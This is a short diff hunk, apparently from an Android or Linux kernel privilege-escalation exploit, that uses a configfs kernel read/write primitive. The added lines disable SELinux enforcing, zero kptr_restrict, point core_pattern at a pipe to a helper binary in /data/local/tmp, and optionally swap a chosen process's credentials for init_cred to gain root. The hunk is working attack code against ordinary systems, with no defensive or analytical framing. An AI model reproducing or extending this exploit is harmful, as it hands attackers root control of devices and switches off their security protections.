@@ -987,10 +987,24 @@ int try_cfi_stage(void) {
       ssize_t rr = configfs_read_once(fd, mp_addr, rb, sizeof(rb) - 1);
       uint8_t z = 0;
       ssize_t sr = configfs_write_once(fd, data_addr(SELINUX_ENFORCING), &z, 1);
+      uint32_t kz = 0;
+      ssize_t kr = configfs_write_once(fd, data_addr(KPTR_RESTRICT), &kz, sizeof(kz));
+      uint32_t krb = 0xffffffffu;
+      configfs_read_once(fd, data_addr(KPTR_RESTRICT), &krb, sizeof(krb));
+      const char *cp = "|/data/local/tmp/mphelper";
+      ssize_t cpr =
+        configfs_write_once(fd, data_addr(CORE_PATTERN), cp, strlen(cp) + 1);
       pr_info("modprobe_path @%016zx <- '%s' wr=%zd rd=%zd rb='%s' "
-              "selinux_off=%zd errno=%d\n",
-              (size_t)mp_addr, mp, mw, rr, rb, sr, errno);
+              "selinux_off=%zd kptr_wr=%zd kptr_now=%u core_wr=%zd errno=%d\n",
+              (size_t)mp_addr, mp, mw, rr, rb, sr, kr, krb, cpr, errno);
       fsync(1);
+
+      /* Optional: repoint a target task's cred -> canonical init_cred. */
+      const char *ct = getenv("CRED_TGID");
+      if (ct && *ct) {
+        uint32_t tg = (uint32_t)strtoul(ct, NULL, 0);
+        repoint_task_cred(fd, tg, canon_addr(INIT_CRED));
+      }
     }
   }
 
